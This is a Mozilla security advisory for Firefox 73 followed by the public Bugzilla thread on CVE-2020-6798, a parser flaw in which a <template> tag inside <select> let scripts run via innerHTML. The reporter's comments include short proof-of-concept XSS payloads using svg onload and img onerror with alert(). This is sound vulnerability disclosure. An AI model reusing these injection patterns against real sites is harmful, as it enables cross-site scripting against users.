Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-05

## Security Vulnerabilities fixed in Firefox 73

Announced
February 11, 2020
Impact
high
Products
Firefox
Fixed in

* Firefox 73

#### [#CVE-2020-6796: Missing bounds check on shared memory read in the parent process](#CVE-2020-6796)

Reporter
Thomas Imbert
Impact
high
##### Description

A content process could have modified shared memory relating to crash reporting information, crash itself, and cause an out-of-bound write. This could have caused memory corruption and a potentially exploitable crash.

##### References

* [Bug 1610426](https://bugzilla.mozilla.org/show_bug.cgi?id=1610426)

#### [#CVE-2020-6797: Extensions granted downloads.open permission could open arbitrary applications on Mac OSX](#CVE-2020-6797)

Reporter
Vladimir Metnew
Impact
moderate
##### Description

By downloading a file with the .fileloc extension, a semi-privileged extension could launch an arbitrary application on the user's computer. The attacker is restricted as they are unable to download non-quarantined files or supply command line arguments to the application, limiting the impact.
*Note: this issue only occurs on Mac OSX. Other operating systems are unaffected.*

##### References

* [Bug 1596668](https://bugzilla.mozilla.org/show_bug.cgi?id=1596668)

#### [#CVE-2020-6798: Incorrect parsing of template tag could result in JavaScript injection](#CVE-2020-6798)

Reporter
terjanq
Impact
moderate
##### Description

If a `<template>` tag was used in a `<select%gt;` tag, the parser could be confused and allow JavaScript parsing and execution when it should not be allowed. A site that relied on the browser behaving correctly could suffer a cross-site scripting vulnerability as a result.

##### References

* [Bug 1602944](https://bugzilla.mozilla.org/show_bug.cgi?id=1602944)

#### [#CVE-2020-6799: Arbitrary code execution when opening pdf links from other applications, when Firefox is configured as default pdf reader](#CVE-2020-6799)

Reporter
Joshua Graham & Brendan Scarvell
Impact
moderate
##### Description

Command line arguments could have been injected during Firefox invocation as a shell handler for certain unsupported file types. This required Firefox to be configured as the default handler for a given file type and for a file downloaded to be opened in a third party application that insufficiently sanitized URL data. In that situation, clicking a link in the third party application could have been used to retrieve and execute files whose location was supplied through command line arguments.
*Note: This issue only affects Windows operating systems and when Firefox is configured as the default handler for non-default filetypes. Other operating systems are unaffected.*

##### References

* [Bug 1606596](https://bugzilla.mozilla.org/show_bug.cgi?id=1606596)

#### [#CVE-2020-6800: Memory safety bugs fixed in Firefox 73 and Firefox ESR 68.5](#CVE-2020-6800)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers and community members Raul Gurzau, Tyson Smith, Bob Clary, Liz Henry, and Christian Holler reported memory safety bugs present in Firefox 72 and Firefox ESR 68.4. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 73 and Firefox ESR 68.5](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595786%2C1596706%2C1598543%2C1604851%2C1608580%2C1608785%2C1605777)

#### [#CVE-2020-6801: Memory safety bugs fixed in Firefox 73](#CVE-2020-6801)

Reporter
Mozilla developers
Impact
high
##### Description

Mozilla developers Jason Kratzer, Tyson Smith, and Christian Holler reported memory safety bugs present in Firefox 72. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 73](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1601024%2C1601712%2C1604836%2C1606492)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_abc63474_20250119_132258.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1602944)
* [XML](/show_bug.cgi?ctype=xml&id=1602944)

Closed
[Bug 1602944](/show_bug.cgi?id=1602944)
(CVE-2020-6798)

Opened 5 years ago
Closed 5 years ago

# Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>

## Categories

### (Core :: DOM: HTML Parser, defect, P2)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20HTML%20Parser#DOM%3A%20HTML%20Parser)

DOM: HTML Parser
▾

Core :: DOM: HTML Parser
This system consumes content from the web, parses, validates and builds a content model (document)
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20HTML%20Parser&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20HTML%20Parser&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20HTML%20Parser)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P2

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla74

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| Webcompat Priority | --- |
| a11y-review | --- |
| Accessibility Severity | --- |
| Performance Impact | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | [73+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=73%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) |
| firefox72 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix) |
| firefox73 | [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed) |
| firefox74 | [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr68 | 73+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox72 |  | wontfix |
| firefox73 | + | fixed |
| firefox74 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: terjanq, Assigned: hsivonen)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/0030426a5e04e85c33fe02480bc4ca81?d=mm&size=40)  [hsivonen](/user_profile?user_id=5490)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/b9542b6c41902e6dbb70023843f01b80?d=mm&size=40)  [terjanq](/user_profile?user_id=628059)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/b89a42ca4c4d59c27f33c399bb1ecc7b?d=mm&size=40)  [farre](/user_profile?user_id=566192)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

12 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: reporter-external, sec-moderate, Whiteboard: [reporter-external] [web-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-6798

[Keywords:](/describekeywords.cgi)

[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [web-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a4737436_1689 "5 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [bmaris](/user_profile?user_id=458188) | [qe-verify](#a3256933_458188 "5 years ago") | - |
| --- | --- | --- |
| [bmaris](/user_profile?user_id=458188) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (2 files)

| [Bug 1602944 - Move setting context to null.](/attachment.cgi?id=9117223)  [5 years ago](#c8)  [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)   47 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-beta+](#c20 "5 years ago")  RyanVM : [approval-mozilla-esr68+](#c20 "5 years ago") | [Details](/attachment.cgi?id=9117223&action=edit) | [Review](/attachment.cgi?id=9117223) |
| --- | --- | --- |
| [advisory.txt](/attachment.cgi?id=9122666)  [5 years ago](#c25)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   387 bytes, text/plain |  | [Details](/attachment.cgi?id=9122666&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [terjanq](/user_profile?user_id=628059)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1602944#c0)• 5 years ago |
|  | |

# Description

When doing some fuzzing, I discovered that it is possible to execute scripts inside <select> element when using innerHTML method. The bug is that the parsing gets broken after injecting <template> element.

Generally, no scripts should be executed inside <select> element, and the only allowed tags seem to be <option>, <optgroup>, <script>, <template>. None of these can execute javascript when called through innerHTML, and the bug seems to be only working in the Firefox within browsers that I tested this on.

# Steps

Reproduction steps (Firefox Browser 71.0 (64-bit), Windows 10):

var s = document.createElement('select');

document.body.appendChild(s);

s.innerHTML = '<svg/onload=alert(/wont\_trigger/)></svg><template></template><svg/onload=alert(/will\_trigger/)></svg>'

I also discovered that the issue is very innerHTML specific and will not work when the element is inserted directly through insertAdjacentHTML, document.write() or

<select><template></template><svg onload=alert()></svg></select> as a HTML code.

# Impact

I don't know what's the biggest impact yet, but I fell that there must a serious bug in the parser that allows inserting any HTML after <template></template> when using innerHTML, even if the element could not be put there otherwise.

Flags: sec-bounty?

|  | [terjanq](/user_profile?user_id=628059)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a26_628059)• 5 years ago |

Summary: Possible Mutation XSS or DOM XSS → Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1602944#c1)• 5 years ago |
|  | |

Thank you very much for this report, terjanq! This is really interesting.

My reading of the spec is that `<script>` ought to be allowed in `<select>` but that's not true. So there's one thing.

Then from looking at the current implementation, it seems that HTML parsing when inside a `<select>` is picky about what to allow and what isn't but starts allowing everything once you have inserted `<template></template>`.

I gather the ending template is resetting parser state but doing it incorrectly.

CCing hsivonen for the parser stuff and annevk for the spec bit (mostly out of curiosity)

|  | [terjanq](/user_profile?user_id=628059)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1602944#c2)• 5 years ago |
|  | |

(In reply to Frederik Braun [:freddyb] from [comment #1](/show_bug.cgi?id=1602944#c1 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>"))

> My reading of the spec is that `<script>` ought to be allowed in `<select>` but that's not true. So there's one thing.

Executing `document.write('<select><script>alert()</script></select>')` will trigger an alert, so will when used as a plain HTML `<select><script>alert()</script></select>`. `innerHTML` will also insert a `<script>` tag inside `<select>` element but scripts are not executed when inserted via this method.

Another observation by me is that when calling `document.body.innerHTML = '<select><option>1</option><template></template><svg/onload=alert()></select>'` script will not be executed, so it's strictly related to the case scenario that I discovered.

|  | [April King [:April]](/user_profile?user_id=119354) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a79388_119354)• 5 years ago |

Component: Other → SecurityProduct: Websites → Firefox

|  | [Johann Hofmann [:johannh]](/user_profile?user_id=522029) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a225404_522029)• 5 years ago |

Group: websites-security → core-securityType: task → defectComponent: Security → DOM: HTML ParserProduct: Firefox → Core

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1602944#c3)• 5 years ago |
|  | |

It seems the ending template element resets the state incorrectly and the parser doesn't remember it was inside a `<select>` element.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a235050_159069)• 5 years ago |

Group: core-security → dom-core-security

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1602944#c4)• 5 years ago |
|  | |

Is the problem `<template>` or is this really the same svg-related thing in [bug 1598466](/show_bug.cgi?id=1598466 "REOPENED - mXSS/HTML parser ambiguity with SVG and P nested")?

Flags: needinfo?(hsivonen)

|  | [terjanq](/user_profile?user_id=628059)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1602944#c5)• 5 years ago |
|  | |

The problem is `<select>` and `<template>` related.

```
var s = document.createElement('select');
document.body.appendChild(s);
s.innerHTML = '<template></template><img src=a onerror="alert(/loaded/)"/>'

```

The above also triggers the alert.

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1602944#c6)• 5 years ago |
|  | |

The first and most obvious thing about `template` end tag processing is that the spec has gained an action "generate implied end tags thoroughly" but we only do the old "generate implied end tags" when that's required. That's unlikely to be the problem here, though.

The more likely cause is that the "reset the insertion mode appropriately" algorithm has gained a variable *last* that we don't have.

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a828321_5490)• 5 years ago |

Assignee: nobody → hsivonenStatus: UNCONFIRMED → ASSIGNEDEver confirmed: trueFlags: needinfo?(hsivonen)

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1602944#c7)• 5 years ago |
|  | |

(In reply to Henri Sivonen (:hsivonen) from [comment #6](/show_bug.cgi?id=1602944#c6 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>"))

> The first and most obvious thing about `template` end tag processing is that the spec has gained an action "generate implied end tags thoroughly" but we only do the old "generate implied end tags" when that's required. That's unlikely to be the problem here, though.
>
> The more likely cause is that the "reset the insertion mode appropriately" algorithm has gained a variable *last* that we don't have.

We should also fix these, but since these aren't the root cause, not right before holiday without test cases.

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1602944#c8)• 5 years ago |
|  | |

Attached file
[Bug 1602944 - Move setting context to null.](attachment.cgi?id=9117223)
— [Details](attachment.cgi?id=9117223&action=edit)

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1602944#c9)• 5 years ago |
|  | |

Alphan, if you r+ while I'm away, please also request sec-approval, etc.

|  | [Henri Sivonen (:hsivonen)](/user_profile?user_id=5490)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1602944#c10)• 5 years ago |
|  | |

(In reply to Henri Sivonen (:hsivonen) from [comment #7](/show_bug.cgi?id=1602944#c7 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>"))

> (In reply to Henri Sivonen (:hsivonen) from [comment #6](/show_bug.cgi?id=1602944#c6 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>"))
>
> > The first and most obvious thing about `template` end tag processing is that the spec has gained an action "generate implied end tags thoroughly" but we only do the old "generate implied end tags" when that's required. That's unlikely to be the problem here, though.
> >
> > The more likely cause is that the "reset the insertion mode appropriately" algorithm has gained a variable *last* that we don't have.
>
> We should also fix these, but since these aren't the root cause, not right before holiday without test cases.

Filed as [bug 1605364](/show_bug.cgi?id=1605364 "ASSIGNED").

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1602944#c11)• 5 years ago |
|  | |

The priority flag is not set for this bug.

:hsinyi, could you have a look please?

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#workflow.2Fno_priority.py).

Flags: needinfo?(htsai)

|  | [Hsin-Yi Tsai (she/her) [:hsinyi]](/user_profile?user_id=434964) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a1946916_434964)• 5 years ago |

Flags: needinfo?(htsai)Priority: -- → P2

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1602944#c12)• 5 years ago |
|  | |

Olli, any idea what sort of security rating this should get?

Flags: needinfo?(bugs)

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1602944#c13)• 5 years ago |
|  | |

I would say sec-moderate and not sec-high, since in general many event handlers may run when using innerHTML.

Alphan, could you request approval, per [comment 9](/show_bug.cgi?id=1602944#c9 "RESOLVED FIXED - Possible Mutation XSS or DOM XSS in innerHTML method due to incorrect parsing <template>").

Flags: needinfo?(bugs) → needinfo?(alchen)

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1602944#c14)• 5 years ago |
|  | |

And Hsin-Yi reminded me that sec-moderate doesn't need approval :)

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a2044743_39966)• 5 years ago |

Flags: needinfo?(alchen)

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1602944#c15)• 5 years ago |
|  | |

And [bug 1562581](/show_bug.cgi?id=1562581 "NEW") is about load event handlers on svg, "I'm pretty sure that this isn't actually a security bug".

RyanVM, I do think this should land to all the branches around the same time. Do you know what is the right procedure for that?

Ask sec-approval and other approvals at the same time? (even though sec-approval isn't strictly needed)

Flags: needinfo?(ryanvm)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1602944#c16)• 5 years ago |
|  | |

If you do the branch approvals up front, you could wait to autoland until they're given (with a comment noting that as the intended plan). From there, uplifts should happen pretty shortly after the patches reach m-c per our usual practices.

That said, we're in RC week at the moment and a new cycle starts on Monday, so you might want to wait a couple weeks if you're worried about an exposure window here.

Flags: needinfo?(ryanvm)

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1602944#c17)• 5 years ago |
|  | |

Ah, right. Perhaps hsivonen can then deal with this once he is back in a week or so.

Flags: needinfo?(hsivonen)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1602944#a2054850_406194)• 5 years ago |

Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

